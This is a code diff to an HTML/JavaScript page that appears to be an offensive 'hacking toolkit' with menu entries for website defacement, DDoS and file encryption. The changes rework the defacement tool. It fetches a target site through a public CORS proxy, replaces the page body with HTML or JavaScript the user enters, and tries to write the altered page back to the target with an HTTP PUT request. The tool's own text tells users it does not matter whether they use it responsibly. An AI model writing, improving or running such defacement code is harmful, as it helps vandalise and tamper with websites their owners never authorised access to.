@@ -321,6 +321,18 @@
          }
  
 
+         /* New Styles */
+         #defacement-backup-link {
+             color: #00ff00;
+             text-decoration: underline;
+         }
+ 
+
+         #defacement-backup-link:hover {
+             color: #fff;
+         }
+ 
+
      </style>
  </head>
  <body>
@@ -338,7 +350,7 @@
          <li onclick="showSection('ddos')">DDoS Tool</li>
          <li onclick="showSection('encryption')">File Encryption Tool</li>
          <li onclick="showSection('reporting')">Reporting</li>
-          </ul>
+     </ul>
  </div>
  
 
@@ -354,6 +366,7 @@
              <p>This tool allows you to modify the appearance of websites. Use responsibly... or don't, I don't give a fuck. <a href="#" onclick="openModal('defacement-info')">Learn more</a></p>
              <input type="text" id="defacement-url" placeholder="Target URL">
              <button onclick="backupWebsite()">Backup Website</button>
+             <a id="defacement-backup-link" style="display: none;" download="website_backup.html">Download Backup</a>
              <textarea id="defacement-code" placeholder="HTML/JS Code"></textarea>
              <button onclick="previewDefacement()">Preview Defacement</button>
              <div id="defacement-preview"></div>
@@ -523,6 +536,9 @@
  
 
      // Defacement Tool
+     let websiteBackupContent;
+ 
+
      function backupWebsite() {
          const url = document.getElementById('defacement-url').value;
          if (!url) {
@@ -538,7 +554,7 @@
              mode: 'cors',
              headers: {
                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                  }
+             }
          })
          .then(response => {
              if (!response.ok) {
@@ -547,14 +563,18 @@
              return response.text();
          })
          .then(html => {
+             websiteBackupContent = html;
              const blob = new Blob([html], { type: 'text/html' });
-             const a = document.createElement('a');
-             a.href = URL.createObjectURL(blob);
-             a.download = 'website_backup.html';
-             document.body.appendChild(a);
-             a.click();
-             document.body.removeChild(a);
-             URL.revokeObjectURL(a.href);
+             const backupURL = URL.createObjectURL(blob);
+ 
+
+             const backupLink = document.getElementById('defacement-backup-link');
+             backupLink.href = backupURL;
+             backupLink.style.display = 'inline';
+             backupLink.onclick = function() {
+                 URL.revokeObjectURL(backupURL);
+                 backupLink.style.display = 'none';
+             };
              console.log('Website backed up successfully.');
              logAction('Website backed up successfully.');
          })
@@ -574,85 +594,85 @@
      }
  
 
-   function applyDefacement() {
-         const url = document.getElementById('defacement-url').value;
-         const code = document.getElementById('defacement-code').value;
-         if (!url) {
-             alert("Please enter a URL.");
+     function applyDefacement() {
+     const url = document.getElementById('defacement-url').value;
+     const code = document.getElementById('defacement-code').value;
+     if (!url) {
+         alert("Please enter a URL.");
+         return;
+     }
+     console.warn(`Attempting to deface: ${url} with code (check console).`);
+     logAction(`Attempting to deface: ${url} with code.`);
+ 
+
+     // CORS Anywhere Proxy
+     const corsProxy = 'https://corsproxy.io/?';
+     const targetUrl = corsProxy + encodeURIComponent(url);
+ 
+
+     fetch(targetUrl, {
+         method: 'GET',
+         headers: {
+             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+         }
+     })
+     .then(response => {
+         if (!response.ok) {
+             throw new Error(`HTTP error! Status: ${response.status}`);
+         }
+         return response.text();
+     })
+     .then(html => {
+         const parser = new DOMParser();
+         const doc = parser.parseFromString(html, 'text/html');
+ 
+
+         if (doc.body) {
+             doc.body.innerHTML = code;
+         } else {
+             console.error('Body element not found.');
+             alert('Could not apply defacement: Body not found.');
+             logAction('Could not apply defacement: Body not found.');
              return;
          }
-         console.warn(`Attempting to deface: ${url} with code (check console).`);
-         logAction(`Attempting to deface: ${url} with code.`);
  
 
-         // CORS Anywhere Proxy
-         const corsProxy = 'https://corsproxy.io/?';
-         const targetUrl = corsProxy + encodeURIComponent(url);
+         const modifiedHtml = new XMLSerializer().serializeToString(doc);
+         document.getElementById('defacement-preview').innerHTML = modifiedHtml;
  
 
-         fetch(targetUrl, {
-             method: 'GET',
+         // Attempt to write the defaced content to the target site
+         fetch(url, {
+             method: 'PUT', // or PATCH, depending on the server's configuration
+             mode: 'no-cors',
              headers: {
+                 'Content-Type': 'text/html',
                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-             }
+             },
+             body: modifiedHtml
          })
          .then(response => {
-             if (!response.ok) {
-                 throw new Error(`HTTP error! Status: ${response.status}`);
-             }
-             return response.text();
-         })
-         .then(html => {
-             const parser = new DOMParser();
-             const doc = parser.parseFromString(html, 'text/html');
- 
-
-             if (doc.body) {
-                 doc.body.innerHTML = code;
+             if (response.ok) {
+                 alert('Defacement applied and pushed to the target site. Preview updated.');
+                 logAction('Defacement applied and pushed to the target site. Preview updated.');
              } else {
-                 console.error('Body element not found.');
-                 alert('Could not apply defacement: Body not found.');
-                 logAction('Could not apply defacement: Body not found.');
-                 return;
-             }
- 
-
-             const modifiedHtml = new XMLSerializer().serializeToString(doc);
-             document.getElementById('defacement-preview').innerHTML = modifiedHtml;
- 
-
-             // Attempt to write the defaced content to the target site
-             fetch(url, {
-                 method: 'PUT', // or PATCH, depending on the server's configuration
-                 mode: 'no-cors',
-                 headers: {
-                     'Content-Type': 'text/html',
-                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                 },
-                 body: modifiedHtml
-             })
-             .then(response => {
-                 if (response.ok) {
-                     alert('Defacement applied and pushed to the target site. Preview updated.');
-                     logAction('Defacement applied and pushed to the target site. Preview updated.');
-                 } else {
-                     console.error('Failed to push defacement to the target site. Status:', response.status);
-                     alert('Defacement applied to preview, but failed to push to the target site. Check console.');
-                     logAction(`Defacement applied to preview, but failed to push to the target site. Status: ${response.status}`);
-                 }
-             })
-             .catch(error => {
-                 console.error('Error pushing defacement to website:', error);
+                 console.error('Failed to push defacement to the target site. Status:', response.status);
                  alert('Defacement applied to preview, but failed to push to the target site. Check console.');
-                 logAction(`Error pushing defacement to website: ${error}`);
-             });
+                 logAction(`Defacement applied to preview, but failed to push to the target site. Status: ${response.status}`);
+             }
          })
          .catch(error => {
-             console.error('Error defacing website:', error);
-             alert('Failed to deface website. Check console.');
-             logAction(`Error defacing website: ${error}`);
+             console.error('Error pushing defacement to website:', error);
+             alert('Defacement applied to preview, but failed to push to the target site. Check console.');
+             logAction(`Error pushing defacement to website: ${error}`);
          });
-     }
+     })
+     .catch(error => {
+         console.error('Error defacing website:', error);
+         alert('Failed to deface website. Check console.');
+         logAction(`Error defacing website: ${error}`);
+     });
+ }
  
 
      // DDoS Tool
@@ -769,6 +789,9 @@
  
 
      // Encryption Tool
+     let originalFileContent;
+ 
+
      function backupFile() {
          const fileInput = document.getElementById('encryption-file');
          const file = fileInput.files[0];
@@ -782,8 +805,8 @@
 
          const reader = new FileReader();
          reader.onload = function(e) {
-             const fileContent = e.target.result;
-             const blob = new Blob([fileContent], { type: 'application/octet-stream' });
+             originalFileContent = e.target.result;
+             const blob = new Blob([originalFileContent], { type: 'application/octet-stream' });
              const url = URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = url;
